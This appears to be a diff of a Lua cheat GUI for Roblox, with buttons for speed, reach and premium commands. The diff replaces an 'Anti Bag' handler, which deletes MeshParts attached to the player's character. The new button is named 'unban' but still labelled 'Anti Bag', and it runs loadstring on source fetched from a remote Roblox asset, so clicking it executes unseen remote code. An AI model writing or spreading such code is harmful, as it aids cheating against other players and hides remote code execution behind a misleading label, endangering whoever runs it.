@@ -29,7 +29,7 @@ local speed = Instance.new("TextButton")
 local UICorner_3 = Instance.new("UICorner")
 local Premiumcmds = Instance.new("TextButton")
 local UICorner_4 = Instance.new("UICorner")
-local antibag = Instance.new("TextButton")
+local unban = Instance.new("TextButton")
 local UICorner_5 = Instance.new("UICorner")
 local reach = Instance.new("TextButton")
 local UICorner_6 = Instance.new("UICorner")
@@ -235,27 +235,17 @@ Premiumcmds.TextSize = 14.000
 UICorner_4.CornerRadius = UDim.new(0.100000001, 0)
 UICorner_4.Parent = Premiumcmds
 
-antibag.Name = "antibag"
-antibag.Parent = main
-antibag.BackgroundColor3 = Color3.fromRGB(116, 116, 116)
-antibag.Position = UDim2.new(0.200342476, 0, 0.207612395, 0)
-antibag.Size = UDim2.new(0, 79, 0, 37)
-antibag.Font = Enum.Font.Fantasy
-antibag.Text = "Anti Bag"
-antibag.TextColor3 = Color3.fromRGB(0, 0, 0)
-antibag.TextSize = 14.000
-antibag.MouseButton1Down:Connect(function()
-		wait(0) local A_1 = "" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
-	local LocalPlayer = game:GetService("Players").LocalPlayer
-	local char = LocalPlayer.Character
-	char.ChildAdded:Connect(function(sock)
-		if sock:IsA("MeshPart") then do
-				wait(0.1)
-				sock:Destroy()
-			end
-		end
-	end)										
-end)
+unban.Name = "unban"
+unban.Parent = main
+unban.BackgroundColor3 = Color3.fromRGB(116, 116, 116)
+unban.Position = UDim2.new(0.200342476, 0, 0.207612395, 0)
+unban.Size = UDim2.new(0, 79, 0, 37)
+unban.Font = Enum.Font.Fantasy
+unban.Text = "Anti Bag"
+unban.TextColor3 = Color3.fromRGB(0, 0, 0)
+unban.TextSize = 14.000
+unban.MouseButton1Down:Connect(function()
+	 loadstring(game:GetObjects("rbxassetid://5812737894")[1].Source)()
 end)
 
 UICorner_5.CornerRadius = UDim.new(0.100000001, 0)
